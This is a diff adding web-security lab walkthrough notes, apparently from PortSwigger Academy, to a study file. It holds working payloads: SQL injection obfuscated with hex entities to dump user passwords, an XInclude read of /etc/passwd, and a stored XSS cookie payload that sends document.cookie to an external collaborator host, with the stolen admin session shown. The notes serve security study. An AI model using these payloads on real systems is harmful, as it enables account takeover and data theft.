@@ -5519,7 +5519,28 @@ Prototype pollution is a JavaScript vulnerability that enables an attacker to ad
   - Bypass the WAF by obfuscating your payload using XML entities (Hackvertor extension）
   `<storeId>1 UNION SELECT NULL</storeId>`
   `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
-- dd
+- Discovering vulnerabilities **quickly with targeted scanning**
+  - active scan `POST /product/stock`
+  - issues: out of band resource load in parameter `productid`
+    `productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=2`
+- Scanning **non-standard data structures**
+  - GET /my-account?id=wiener > Select the first part of the session cookie, the cleartext "wiener" > `Scan selected insertion point`
+  - issues: cross-site scripting (stored)
+  - send the request to repeater
+    ```
+    original
+    Cookie: session=wiener:sKiLSyIVOOVaP2DcV5Avll7JT09J2WZs; session='"><svg/onload=fetch`//qmgxbvww5l0yht1woet79uyublhh57tzjnadx3ls\.oastify.com`>:gVMBuVlrUZqFK00Ujt6sqGmIgexfzljb
+    
+    payload
+    '"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
+    
+    replace
+    '"><svg/onload=fetch(`//cq63580niz3aoyy3a2m8whfqthz8n0bp.oastify.com/${encodeURIComponent(document.cookie)}`)>:gVMBuVlrUZqFK00Ujt6sqGmIgexfzljb
+    ```
+  - wait a while, Burp collaborator show the response > copy the request url > decode as url
+    `GET /session=administrator%3an7ro2rZVmnA8EBc4pn32Rji9TipHhQHd; secret=6PtCxwEiBewuuH7Wa4IFD58V6iaPyKaP; session=administrator%3an7ro2rZVmnA8EBc4pn32Rji9TipHhQHd`
+  - change the cookie value in DevTool > refresh the page > admin panel appear
+  
 
 # Windows installation tools
 1. Burp Suite Pro
